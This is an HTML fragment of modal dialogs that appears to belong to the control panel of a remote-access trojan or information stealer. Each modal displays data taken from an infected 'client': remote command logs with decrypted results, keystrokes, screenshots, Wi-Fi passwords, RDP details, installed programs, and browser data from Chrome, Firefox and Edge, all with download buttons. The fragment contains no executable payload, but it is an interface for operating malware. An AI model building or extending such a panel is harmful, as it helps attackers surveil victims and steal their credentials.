<!-- Log Details Modal -->
<div id="log-modal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2 class="modal-title text-yellow-400">Log Details</h2>
            <button class="modal-close">&times;</button>
        </div>
        <div class="modal-body">
            <div class="space-y-4">
                <p><strong>Client ID:</strong> <span id="log-modal-client-id"></span></p>
                <p><strong>Command:</strong> <span id="log-modal-command"></span></p>
                <p><strong>Status:</strong> <span id="log-modal-status"></span></p>
                <p><strong>Created At:</strong> <span id="log-modal-created-at"></span></p>
                <p><strong>Completed At:</strong> <span id="log-modal-completed-at"></span></p>
                <div>
                    <div class="tabs">
                        <div class="tab active" data-tab="result-decrypted">Decrypted Result</div>
                        <div class="tab" data-tab="result-raw">Raw Result</div>
                    </div>
                    <textarea class="editor" id="log-modal-result-decrypted" readonly></textarea>
                    <textarea class="editor" id="log-modal-result-raw" readonly style="display: none;"></textarea>
                </div>
                <button id="log-download-log" class="btn btn-primary">
                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/>
                    </svg>
                    Download Log
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Client Data Modal -->
<div id="data-modal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2 class="modal-title text-blue-400">Client Data Details</h2>
            <button class="modal-close">&times;</button>
        </div>
        <div class="modal-body">
            <div class="space-y-4">
                <p><strong>Client ID:</strong> <span id="data-modal-client-id"></span></p>
                <p><strong>Created At:</strong> <span id="data-modal-created-at"></span></p>
                <div>
                    <div class="tabs">
                        <div class="tab active" data-tab="keystrokes">Keystrokes</div>
                        <div class="tab" data-tab="system-info">System Info</div>
                        <div class="tab" data-tab="screenshot">Screenshot</div>
                    </div>
                    <textarea class="editor" id="data-modal-keystrokes" readonly></textarea>
                    <textarea class="editor" id="data-modal-system-info" readonly style="display: none;"></textarea>
                    <img id="data-modal-screenshot" class="screenshot-img" style="display: none;" alt="Screenshot">
                </div>
                <button id="data-download-data" class="btn btn-primary">
                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/>
                    </svg>
                    Download Data
                </button>
            </div>
        </div>
    </div>
</div>

<!-- WiFi Modal -->
<div id="wifi-modal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2 class="modal-title text-indigo-400">Wi-Fi Password Details</h2>
            <button class="modal-close">&times;</button>
        </div>
        <div class="modal-body">
            <div class="space-y-4">
                <p><strong>Client ID:</strong> <span id="wifi-modal-client-id"></span></p>
                <p><strong>Created At:</strong> <span id="wifi-modal-created-at"></span></p>
                <div>
                    <textarea class="editor" id="wifi-modal-content" readonly></textarea>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- RDP Modal -->
<div id="rdp-modal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2 class="modal-title text-purple-400">RDP Connection Details</h2>
            <button class="modal-close">&times;</button>
        </div>
        <div class="modal-body">
            <div class="space-y-4">
                <p><strong>Client ID:</strong> <span id="rdp-modal-client-id"></span></p>
                <p><strong>Created At:</strong> <span id="rdp-modal-created-at"></span></p>
                <div>
                    <textarea class="editor" id="rdp-modal-content" readonly></textarea>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Program Modal -->
<div id="program-modal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2 class="modal-title text-teal-400">Installed Programs Details</h2>
            <button class="modal-close">&times;</button>
        </div>
        <div class="modal-body">
            <div class="space-y-4">
                <p><strong>Client ID:</strong> <span id="program-modal-client-id"></span></p>
                <p><strong>Created At:</strong> <span id="program-modal-created-at"></span></p>
                <div>
                    <textarea class="editor" id="program-modal-content" readonly></textarea>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Comprehensive Browser Data Modal -->
<div id="browser-data-modal" class="modal">
    <div class="modal-content" style="max-width: 1400px;">
        <div class="modal-header">
            <h2 class="modal-title text-blue-400">Comprehensive Browser Data</h2>
            <button class="modal-close">&times;</button>
        </div>
        <div class="modal-body">
            <div class="space-y-4">
                <p><strong>Client ID:</strong> <span id="browser-data-modal-client-id"></span></p>
                <p><strong>Collected At:</strong> <span id="browser-data-modal-collected-at"></span></p>
                
                <div>
                    <div class="tabs">
                        <div class="tab active" data-tab="chrome">Chrome</div>
                        <div class="tab" data-tab="firefox">Firefox</div>
                        <div class="tab" data-tab="edge">Edge</div>
                        <div class="tab" data-tab="raw">Raw JSON</div>
                    </div>
                    
                    <div id="browser-chrome" class="browser-tab-content">
                        <textarea class="editor" id="browser-data-chrome" readonly style="min-height: 400px;"></textarea>
                    </div>
                    <div id="browser-firefox" class="browser-tab-content" style="display: none;">
                        <textarea class="editor" id="browser-data-firefox" readonly style="min-height: 400px;"></textarea>
                    </div>
                    <div id="browser-edge" class="browser-tab-content" style="display: none;">
                        <textarea class="editor" id="browser-data-edge" readonly style="min-height: 400px;"></textarea>
                    </div>
                    <div id="browser-raw" class="browser-tab-content" style="display: none;">
                        <textarea class="editor" id="browser-data-raw" readonly style="min-height: 400px;"></textarea>
                    </div>
                </div>
                
                <button id="browser-download-data" class="btn btn-primary">
                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/>
                    </svg>
                    Download Browser Data
                </button>
            </div>
        </div>
    </div>
</div>